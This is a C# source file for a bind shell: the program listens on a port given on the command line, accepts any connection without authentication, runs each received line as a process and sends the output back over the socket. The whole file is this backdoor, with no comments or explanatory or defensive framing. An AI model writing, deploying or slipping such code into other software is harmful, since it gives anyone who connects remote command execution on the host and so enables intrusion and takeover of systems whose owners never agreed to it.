using System;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace bind
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			int port = int.Parse (args [0]);
			TcpListener listener = new TcpListener (IPAddress.Any, port);

			try {
				listener.Start ();
			} catch {
				return;
			}

			while (true) {
				NetworkStream stream = new NetworkStream (listener.AcceptSocket ());

				using (StreamReader rdr = new StreamReader(stream)) {
					while (stream.CanRead) {
						string cmd = rdr.ReadLine();
						string filename = string.Empty;
						string arg = string.Empty;

						if (cmd.IndexOf(' ') > 0) { 
							filename = cmd.Substring(0, cmd.IndexOf(' '));
							arg = cmd.Substring(cmd.IndexOf(' '), cmd.Length - filename.Length);
						} else {
							filename = cmd;
						}

						Process prc = new Process ();
						prc.StartInfo = new ProcessStartInfo ();
						prc.StartInfo.FileName = filename;
						prc.StartInfo.Arguments = arg;
						prc.StartInfo.UseShellExecute = false;
						prc.StartInfo.RedirectStandardOutput = true;
						prc.Start ();
						prc.WaitForExit ();
					 
						byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
						stream.Write(results, 0, results.Length);
					}
				}
			}
		}
	}
}
